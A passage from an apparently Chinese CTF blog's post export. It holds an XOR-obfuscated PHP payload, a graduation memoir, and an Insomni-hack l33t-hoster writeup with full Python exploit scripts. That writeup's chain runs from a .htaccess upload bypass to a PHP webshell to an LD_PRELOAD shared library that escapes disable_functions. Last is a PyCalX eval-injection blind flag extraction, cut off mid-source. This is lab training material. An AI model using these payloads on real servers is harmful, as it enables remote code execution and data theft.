0xd1, 0x96, 0x8c] # to be deletedtemp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if a == b == c == d: continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) 除了必要的()^;以外，我们最多剩余9个字符的空间，逐步删除result里的值，当结果仍能保持11个，就意味着我们可以继续删除了。 所以我们整理结果：print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)(%9b%8f%9b%9c%9c%9b%8f)(%8f%9e%96%96%8c%a0%9e)(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)(%9b%9b%9b%9c%a0%9b%8f)(%8c%9c%9e%96%a0%96%9e)(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 可以发现当前目录下有一个 n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt文件，我们尝试直接打开。403，行吧。那么我们接着读文件。scandir返回的是个数组，且刚才的结果显示我们要找的文件在scandir的结果最后面，那么用end()方法就可以得到文件名了。读文件可以用show_source或者readfile。 123456789101112131415result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158] # Original chars,14 totalresult = [160, 136, 141, 209, 151, 154, 155, 156]temp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c): continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) Payload:show_source(end(scandir(.)));==((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); flag{e5b1ade2-294f-4422-a8c9-1467233ba6b5}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Regex","slug":"Regex","permalink":"http://tiaonmmn.github.io/tags/Regex/"}]},{"title":"flag{thats_it}","slug":"flag-thats-it","date":"2019-06-12T06:53:12.000Z","updated":"2019-12-10T12:15:12.611Z","comments":true,"path":"2019/06/12/flag-thats-it/","link":"","permalink":"http://tiaonmmn.github.io/2019/06/12/flag-thats-it/","excerpt":"要毕业了，第三届蓝帽杯初赛打完，4年CTF生涯也算正式结束了，小小的纪念一下自己的所作所为吧。文笔不行，见谅。 Part 1.Why am I here? 我自7岁起就接触计算机了，DOS、Windows 98、Windows ME、Windows 2000等系统我是实际使用过的。一直觉得好玩，计算机的世界很有趣。","text":"要毕业了，第三届蓝帽杯初赛打完，4年CTF生涯也算正式结束了，小小的纪念一下自己的所作所为吧。文笔不行，见谅。 Part 1.Why am I here? 我自7岁起就接触计算机了，DOS、Windows 98、Windows ME、Windows 2000等系统我是实际使用过的。一直觉得好玩，计算机的世界很有趣。 我就读于中国人民公安大学，这是一所被称为“警中清华”的学校。为什么我会来到这里？很简单，父母要求的。说来惭愧，我在高中的时候成绩不是很好，高三下学期两次模拟的时候一次495，一次525。然后就被认为是上不了一本的货，想着以后当个警察，至少稳定。所以，高考志愿的时候我就报了个中国人民公安大学的提前批。结果成绩下来，605（当年一本分数线500）。行吧，去也得去，不去也得去了，当时报志愿的时候，家里给我的唯一自主选择权就是专业，自不必说，网络安全与执法了。 就这样，我来到了中国人民公安大学网络安全与执法大队，开始了四年求学生活。 Part 2.How is it here? 回忆警校生活，估计每个当事人都要讲一遍惨不忍睹的军训。警校的军训应该是军校以外最严格的了。我们这一届很幸运（或者说不幸），被安排在学校内军训。然后就是被各种安排，当时的各种疼，各种累，现在发现都想不起来了，记得的都是教官与同学们之间有趣的事情了。 正式开学后，照常是警务化管理，早上6点30要跑操，7点35要集合走队列上课，无处不在的警督时刻抓你上课睡觉、警容不整，每周还至少一次的5公里长跑，晚上10点30准时熄灯不准玩手机，等等。我个人倒是挺习惯的，没觉得有什么压力。就这么正常的坚持了4年。 警校里学习成绩也是很重要的，不要被某些电影带偏了。至少在这里，学习成绩决定着入党名额、奖学金、干部名额这些涉及到切身利益的东西。以及，挂科是很难受的，因为会耽误你评上上述那些东西的资格。好在，我苟住了，没有挂过科。 期间作为警校生，各种乱七八糟的安保、实习什么的自然是接触过，G20、一带一路、上合峰会，一个都没落下全赶上了。派出所实习也体验到了人生百态，抓过嫖，带过人，监狱看守所什么的看门老大爷都快认识了。 大一到大四一晃就过去了，大四上学期基本就一直在为找工作做准备，然后现在工作还是没定的状态。大四下就在写毕业论文，然后就在懵懵懂懂中迎来了毕业。 Part 3.When in CTF? 其实来到这个专业的时候，我以为同学都是至少有点网络安全基本知识的，最起码自己安装个系统是没啥问题的。结果我发现我错了，很多人是不会的。所以在大一的时候，全区队的笔记本电脑我应该是都修过的，当然，业务偶尔延伸到其他区队。 可能是因为会修电脑？有一天2012级的吴凡师姐突然加我微信问我有没有兴趣参加他们的组织？当时应该叫做网络特警队来着的，答应以后就碰到了一大票师兄师姐，像周之童师兄、曾宇圣师兄（nonick，鸡丁师傅），吴凡师姐（阿里大佬）等人，他们告诉我有种东西叫CTF，然后我就入坑了。2333333。记得很清楚，第一场参加的比赛是ZCTF2015，看了个Misc，一个流量题，提出来了个压缩包，然后怎么都找不到密码，赛后发现是个网页里提到了password，还是个中文密码。第一次参加就被这么套路，不过依然觉得很有意思。此后就在各位大佬的带领下，组了个队（队名应该都知道了，宫保鸡丁），以赛代练，打怪升级。 然后，12级的就毕业了，就轮到我们了。按理来讲，这种成队伍的组织应该是一届届的传下去的，很不幸的，到13级这里断了。只有14级的几个师兄和我还有Vicen在坚持走下去。其实现在回忆一下，我们也是比较惨的，可以说整个学校，只有我们不到10个人听说过CTF这个东西并且有一定基础能够参与，每次比赛都只能在宿舍或者空教室里打，还要时常被各种奇怪活动打断，能坚持下来感觉也是蛮不可思议的了。好在G20安保的时候得到了学院的支持，参加了第一届XMan夏令营，认识了许多前辈与一起玩的小伙伴，算是真正的能叫做一名CTF选手了。 14级师兄们毕业以后，就剩下了我和Vicen两个人能打了，结果就是我们两个人扛了2017-2019年几乎所有的比赛。真的很累，两个人从早做到晚，结果发现还剩下70%左右的题目没做，那个时候明白了什么叫做力不从心。后来学院成立了个网络安全实验班，不知道是不是因为我们，但确实我们看到了下一代的希望，现在，在S.W.A.T（什么鬼ID）同学的带领下，他们能够出现在比赛排名的前100、前50、前25里，至于这个队伍以后会是什么样子，我也不知道，但人类最伟大的智慧包含在四个字里，“等待”与“希望”嘛。 以及，Web狗在CTF里是没有活路的，Pwn才是爷爷。我不做Web了，JoJo！ Part 4.Conclusion 看了berTrAM的文章才想起来我们也要走了，写着写着就突然不想写了，总感觉真的写完了，所有发生过的事情也真的就只能成为回忆了。大概这就叫做“临表涕零，不知所言”吧。 最后，当然是致谢部分啦（无顺序排列）： 感谢Vicen，陪我扛了几乎所有的比赛。 感谢各位12级的师兄师姐，带我入坑。 感谢136、333的各位，在四年里提供的无私关怀（老父亲对儿子的那种）。 感谢高见老师，给我们提供了大量的帮助。 感谢房长明队长，在G20等安保期间帮我们搞定了乱七八糟的问题，以及四年的陪伴。 感谢421的各位，给了个在学生会里有个能闲聊能熬夜的地方。 感谢invictus0510，公安大学里结交的挚友。 感谢2017级网络安全实验班的各位同学，让我看到了以后的希望。 //最后，感谢一下没有四年来没有出现的女（男？）朋友，让我能够不分心？??？?？ flag{813d3d43-efe9-457a-bfee-2fd9009d09aa}","categories":[{"name":"Something else","slug":"Something-else","permalink":"http://tiaonmmn.github.io/categories/Something-else/"}],"tags":[{"name":"Balabala","slug":"Balabala","permalink":"http://tiaonmmn.github.io/tags/Balabala/"}]},{"title":"Insomni-hack-teaser-2019-l33-hoster","slug":"Insomni-hack-teaser-2019-l33-hoster","date":"2019-05-15T07:12:59.000Z","updated":"2020-03-05T07:19:37.215Z","comments":true,"path":"2019/05/15/Insomni-hack-teaser-2019-l33-hoster/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/","excerpt":"脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址后面贴。","text":"脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址后面贴。 # Part 1. .htaccess 上传 + getshell 这个题打开后是个上传页面，猜一下是上传 PHP 文件，getshell，读 flag。F12 后发现提示有 source。那就看一下源码吧。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 &lt;?phpif (isset($_GET[&quot;source&quot;])) die(highlight_file(__FILE__));session_start();if (!isset($_SESSION[&quot;home&quot;])) &#123; $_SESSION[&quot;home&quot;] = bin2hex(random_bytes(20));&#125;$userdir = &quot;images/&#123;$_SESSION[&quot;home&quot;]&#125;/&quot;;if (!file_exists($userdir)) &#123; mkdir($userdir);&#125;$disallowed_ext = array( &quot;php&quot;, &quot;php3&quot;, &quot;php4&quot;, &quot;php5&quot;, &quot;php7&quot;, &quot;pht&quot;, &quot;phtm&quot;, &quot;phtml&quot;, &quot;phar&quot;, &quot;phps&quot;,);if (isset($_POST[&quot;upload&quot;])) &#123; if ($_FILES[&#x27;image&#x27;][&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123; die(&quot;yuuuge fail&quot;); &#125; $tmp_name = $_FILES[&quot;image&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;image&quot;][&quot;name&quot;]; $parts = explode(&quot;.&quot;, $name); $ext = array_pop($parts); if (empty($parts[0])) &#123; array_shift($parts); &#125; if (count($parts) === 0) &#123; die(&quot;lol filename is empty&quot;); &#125; if (in_array($ext, $disallowed_ext, TRUE)) &#123; die(&quot;lol nice try, but im not stupid dude...&quot;); &#125; $image = file_get_contents($tmp_name); if (mb_strpos($image, &quot;&lt;?&quot;) !== FALSE) &#123; die(&quot;why would you need php in a pic.....&quot;); &#125; if (!exif_imagetype($tmp_name)) &#123; die(&quot;not an image.&quot;); &#125; $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123; die(&quot;lol noob, your pic is not l33t enough&quot;); &#125; $name = implode(&quot;.&quot;, $parts); move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);&#125;echo &quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;;foreach(glob($userdir . &quot;*&quot;) as $file) &#123; echo &quot;&lt;li&gt;&lt;a href=&#x27;$file&#x27;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;;&#125;echo &quot;&lt;/ul&gt;&quot;;?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=&quot;POST&quot; action=&quot;?&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt; &lt;input type=&quot;submit&quot; name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt; 摆明了就是要上传 PHP 文件了。上传的文件都会在 images / 随机目录 里存放，其中给了我们如下限制条件： 上传的文件名后缀不能是如下之一： “php”,”php3”,”php4”,”php5”,”php7”,”pht”,”phtm”,”phtml”,”phar”,”phps”； 上传的文件不能出现”&lt;?“； 上传的文件得是一个合法的图片文件，还的是 1337*1337 规格的。 第一条把 PHP 引擎默认处理的后缀全处理掉了，第二条规则在 PHP7 之前还是可以用 &lt;script language='php'&gt;&lt;/sciprt&gt; 绕的，但是这个 PHP7 里废除了，第三条倒是好办，找张 1337*1337 尺寸的图片就好办。 这个时候，为了突破第一条限制，我们就可以上传一个.htaccess 文件了，在开启了 AllowOverride 下，.htaccess 文件可以修改 PHP 能解析的文件后缀。但是，上传.htaccess 文件需要将实际内容放在一个正常图片后面。而正常的 1337*1337 大小的图片里肯定会出现大量无法正常解析的内容。因此我们需要找到一种能够尽量短小精悍的图片格式。翻了一下 exif_imagetype() 的文档，发现 wbmp 格式的文件似乎能够满足要求，它的开头是 ，不影响.htaccess 文件解析。而为了将图片文件影响到最小，我们需要进行压缩。 1234567891011121314151617181920 &lt;?phperror_reporting(0);$contents = file_get_contents(&quot;../original.wbmp&quot;); //original,wbmp就是一个非常小的正常wbmp文件$i = 0;while (true) &#123; $truncated = substr($contents, 0, $i); file_put_contents(&quot;truncated.wbmp&quot;, $truncated); if (exif_imagetype(&quot;truncated.wbmp&quot;)) break; $i += 1;&#125;echo &quot;Shortest file size : $i\\n&quot;;var_dump(exif_imagetype(&quot;truncated.wbmp&quot;));var_dump(getimagesize(&quot;truncated.wbmp&quot;));?&gt; 从文件末后往前缩小直到文件不再合法为止，最后我们得到一个 6 字节的 wbmp 文件。为了满足 1337*1337 的大小要求，把它拖进 010Editor 里改，最后得到正确的文件。 尝试上传，果然没啥大问题了。注意一点，源码 39-41 行的操作，如果在 aaa.bbb 文件名中 aaa 不存在，就会将.bbb 前移一位，因此需要两个.。 下面考虑.htaccess 文件需要些什么内容。参考其他.htaccess getshell 的文章，我们可以使用 AddType x-httpd-php .tiaonmmn 这种自定义后缀名来强行使用 PHP 解释器，但是第二条限制我们仍然过不去，不能出现 “&lt;?”。后来知道了，Apache2 配置文件里可以用 php_value 来覆盖 php.ini 的设置，而 php.ini 的设置里有一条比较有趣的条目：auto_append_file，用来在所有 PHP 文件前先行 include 一个文件，以及最重要的一点：auto_append_file 可以使用 PHP 流。那么，我们可以上传两个文件，一个用来写入 shell，而另一个用来触发 shell。而写入的 shell 使用 base64 编码，在.htaccess 中设置 php_value 为 auto_append_file php://filter/convert.base64-decode/resource=”shell 文件名”.tiaonmmn，这样就可以绕过 &lt;? 的限制。 为了方便起见，我们用一个 Python 脚本简化一下步骤： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python3import requestsimport base64VALID_WBMP = b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;URL = &quot;http://xxx.yyy.zzz.www/&quot;RANDOM_DIRECTORY = &quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;COOKIES = &#123; &quot;PHPSESSID&quot; : &quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;&#125;def upload_content(name, content): data = &#123; &quot;image&quot; : (name, content, &#x27;image/png&#x27;), &quot;upload&quot; : (None, &quot;Submit Query&quot;, None) &#125; response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;&quot;&quot;&quot;TARGET_FILE = VALID_WBMP + b&quot;AA&quot; + base64.b64encode(b&quot;&quot;&quot;&lt;?php var_dump(&quot;works&quot;);?&gt;&quot;&quot;&quot;)upload_content(&quot;..htaccess&quot;, HT_ACCESS)upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;)print(response.text) 改 TARGET_FILE 中的 php 代码即可任意执行。 Part 2. 绕过 disable_functions 执行一下 phpinfo ()，发现能执行系统命令的函数基本都被禁用了。然后列了一下目录，发现根目录下有一个 flag 文件和一个 get_flag 程序，显然 flag 文件需要 get_flag 命令去读。那么我们就需要执行系统命令。仔细观察 disable_functions，putenv 没有被禁用。目标很明确了：写一个 so 库，利用 mail 函数使用 LD_PRELOAD 变量绕过 disable_functions。 123456789101112131415161718192021/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload(char *cmd) &#123; char buf[512]; strcpy(buf, cmd); strcat(buf, &quot; &gt; /tmp/_0utput.txt&quot;); system(buf);&#125;int getuid() &#123; char *cmd; if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); if ((cmd = getenv(&quot;_evilcmd&quot;)) != NULL) &#123; payload(cmd); &#125; return 1;&#125; 上述代码将从环境变量_evilcmd 中执行命令，结果重定向到 /tmp/_0utput.txt 中，那么 shell.tiaonmmn 需要完成的就是 putenv LD_PRELOAD 和_evilcmd，调用 mail () 函数，最后读 /tmp/_0utput.txt 文件。我们的 Python 脚本要更新一下了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3import requestsimport base64VALID_WBMP = b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;URL = &quot;http://35.246.234.136/&quot;RANDOM_DIRECTORY = &quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;COOKIES = &#123; &quot;PHPSESSID&quot; : &quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;&#125;def upload_content(name, content): data = &#123; &quot;image&quot; : (name, content, &#x27;image/png&#x27;), &quot;upload&quot; : (None, &quot;Submit Query&quot;, None) &#125; response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;&quot;&quot;&quot;TARGET_FILE = VALID_WBMP + b&quot;AA&quot; + base64.b64encode(b&quot;&quot;&quot;&lt;?phpmove_uploaded_file($_FILES[&#x27;evil&#x27;][&#x27;tmp_name&#x27;], &#x27;/tmp/evil.so&#x27;);putenv(&#x27;LD_PRELOAD=/tmp/evil.so&#x27;);putenv(&quot;_evilcmd=uname -a&quot;);mail(&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;);echo file_get_contents(&#x27;/tmp/_0utput.txt&#x27;);?&gt;&quot;&quot;&quot;)upload_content(&quot;..htaccess&quot;, HT_ACCESS)upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)files = &#123; &quot;evil&quot; : open(&quot;../payloads/evil.so&quot;, &quot;rb&quot;) &#125;response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;, files=files)print(response.text) 我们尝试执行一下 get_flag 命令： 啊，看来还没有结束。 Part 3. Get the f**king flag 把 get_flag 下载到本地，IDA 分析发现这个程序随机生成数字，要求在 1s 内给出答案，否则程序退出。那么，同样的思路，不过 so 库文件要完成一系列的操作了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;int main() &#123; pid_t pid = 0; int inpipefd[2]; int outpipefd[2]; pipe(inpipefd); pipe(outpipefd); pid = fork(); if (pid == 0) &#123; dup2(outpipefd[0], STDIN_FILENO); dup2(inpipefd[1], STDOUT_FILENO); dup2(inpipefd[1], STDERR_FILENO); prctl(PR_SET_PDEATHSIG, SIGTERM); execl(&quot;/get_flag&quot;, &quot;get_flag&quot;, (char*) NULL); exit(1); &#125; close(outpipefd[0]); close(inpipefd[1]); char data[0xff] = &#123;0&#125;; // Read first line for (; data[0] != &#x27;\\n&#x27;; read(inpipefd[0], data, 1)); // Read captcha read(inpipefd[0], data, 0xff); uint64_t sum = 0; char *pch; printf(&quot;Raw : %s\\n&quot;, data); pch = strtok (data, &quot;+&quot;); printf(&quot;Sum : %lu\\n&quot;, sum); while (pch != 0) &#123; sum += strtoull(pch, 0, 10); printf(&quot;Operand : %lu\\n&quot;, atol(pch)); printf(&quot;Sum : %lu\\n&quot;, sum); pch = strtok (0, &quot;+&quot;); &#125; char result[32] = &#123;0&#125;; sprintf(result, &quot;%lu\\n&quot;, sum); printf(&quot;Result : %lu\\n&quot;, sum); write(outpipefd[1], result, 16); memset(data, 0, 0xff); read(inpipefd[0], data, 0xff); printf(&quot;Final : %s&quot;, data);&#125; 将文件编译完，上传，_evilcmd 执行后，得到结果。最终得到 flag。 flag{67901b58-bd98-4494-b502-df1434c9a6ba}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"},{"name":"LD_PRELOAD","slug":"LD-PRELOAD","permalink":"http://tiaonmmn.github.io/tags/LD-PRELOAD/"},{"name":"disable_functions","slug":"disable-functions","permalink":"http://tiaonmmn.github.io/tags/disable-functions/"}]},{"title":"MeePwn2018-PyCalX 1-2","slug":"MeePwn2018-PyCalX-1-2","date":"2019-05-15T07:08:11.000Z","updated":"2020-03-05T07:20:52.239Z","comments":true,"path":"2019/05/15/MeePwn2018-PyCalX-1-2/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/","excerpt":"一道 Python 的题，绕沙盒的。环境在这。 Part 1. PyCalX-Version1 题目给了源码。","text":"一道 Python 的题，绕沙盒的。环境在这。 Part 1. PyCalX-Version1 题目给了源码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python3import cgi;import sysfrom html import escapeFLAG = open(&#x27;/var/www/flag&#x27;,&#x27;r&#x27;).read()OK_200 = &quot;&quot;&quot;Content-type: text/html&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;&lt;center&gt;&lt;title&gt;PyCalx&lt;/title&gt;&lt;h1&gt;PyCalx&lt;/h1&gt;&lt;form&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1 abc)&#x27; autofocus/&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1 abc)&#x27; /&gt;&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;&lt;/form&gt;&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;&lt;/center&gt;&quot;&quot;&quot;print(OK_200)arguments = cgi.FieldStorage()if &#x27;source&#x27; in arguments: source = arguments[&#x27;source&#x27;].valueelse: source = 0if source == &#x27;1&#x27;: print(&#x27;&lt;pre&gt;&#x27;+escape(str(open(__file__,&#x27;r&#x27;).read()))+&#x27;&lt;/pre&gt;&#x27;)if &#x27;value1&#x27; in arguments and &#x27;value2&#x27; in arguments and &#x27;op&#x27; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#x27;(&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;] # I don&#x27;t like tuple, list and dict. if val == &#x27;&#x27; or [c for c in blacklist if c in val] != []: print(&#x27;&lt;center&gt;Invalid value %s&lt;/center&gt;&#x27;%val) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#x27;+&#x27;,&#x27;-&#x27;,&#x27;/&#x27;,&#x27;*&#x27;,&#x27;=&#x27;,&#x27;!&#x27;] if val == &#x27;&#x27; or val[0] not in list_ops: print(&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;) sys.exit(0) return val op = get_op(arguments[&#x27;op&#x27;].value) value1 = get_value(arguments[&#x27;value1&#x27;].value) value2 = get_value(arguments[&#x27;value2&#x27;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;) print(&#x27;&gt;&gt;&gt;&gt; print(&#x27;+escape(calc_eval)+&#x27;)&#x27;) try: result = str(eval(calc_eval)) if result.isdigit() or result == &#x27;True&#x27; or result == &#x27;False&#x27;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#x27;t support output as a string due to security issue. except: print(&quot;Invalid&quot;) print(&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;) 就是用 eval 实现了个简易计算器，而 FLAG 已经读进程序了，暂时不想绕沙盒 getshell 的事情。两个值要求不能出现”、’、[、]、(、) 这些符号，而中间的运算符要求必须是 + - * / ! = 这几个，但是请注意源码 50 行，它使用的是 op [0]，后面的没做任何限制，因此可以出现 +'' 这种符号。而程序允许我们使用字符串运算，但是没法直接返回结果。因此思路非常明确了：通过类似盲注的方式，逐位判断 FLAG。但是我们需要一个第三方能控制的变量，value1 没法真正参与运算。这个时候，我们发现还有一个 source 变量，虽然是用来显示源码的，但是它的作用域是全局，可以参与运算，并且可以控制。那么可以开始写脚本了。 123456789101112131415161718192021222324import requestsimport urllibimport stringurl=&quot;http://192.168.60.130/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;flag=&quot;&quot;source=&quot;&quot;value1=urllib.parse.quote(&quot;WQERGFD&quot;)op=urllib.parse.quote(&quot;+&#x27;&quot;)value2=urllib.parse.quote(&quot; and FLAG&gt;source#&quot;)while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if &quot;False&quot; in result and &quot;security&quot; not in result: flag+=chr(prev-1) print(flag) break else: prev=i Python 比较字符串大小的时候，逐位判断，第一位相同时比较下一位。因此我们不需要 [1] 这种指示位数。 Part 2. PyCalX-Version2 第一个版本的 PyCalX 由于 op 没有仔细判断，第二个版本的就改过来了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 #!/usr/bin/env python3import cgi;import sysfrom html import escapeFLAG = open(&#x27;/var/www/flag&#x27;,&#x27;r&#x27;).read()OK_200 = &quot;&quot;&quot;Content-type: text/html&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;&lt;center&gt;&lt;title&gt;PyCalx&lt;/title&gt;&lt;h1&gt;PyCalx&lt;/h1&gt;&lt;form&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1 abc)&#x27; autofocus/&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1 abc)&#x27; /&gt;&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;&lt;/form&gt;&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;&lt;/center&gt;&quot;&quot;&quot;print(OK_200)arguments = cgi.FieldStorage()if &#x27;source&#x27; in arguments: source = arguments[&#x27;source&#x27;].valueelse: source = 0if source == &#x27;1&#x27;: print(&#x27;&lt;pre&gt;&#x27;+escape(str(open(__file__,&#x27;r&#x27;).read()))+&#x27;&lt;/pre&gt;&#x27;)if &#x27;value1&#x27; in arguments and &#x27;value2&#x27; in arguments and &#x27;op&#x27; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#x27;(&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;] # I don&#x27;t like tuple, list and dict. if val == &#x27;&#x27; or [c for c in blacklist if c in val] != []: print(&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#x27;+&#x27;,&#x27;-&#x27;,&#x27;/&#x27;,&#x27;*&#x27;,&#x27;=&#x27;,&#x27;!&#x27;] if val == &#x27;&#x27; or val[0] not in list_ops: print(&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;) sys.exit(0) return val op = get_op(get_value(arguments[&#x27;op&#x27;].value)) value1 = get_value(arguments[&#x27;value1&#x27;].value) value2 = get_value(arguments[&#x27;value2&#x27;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) 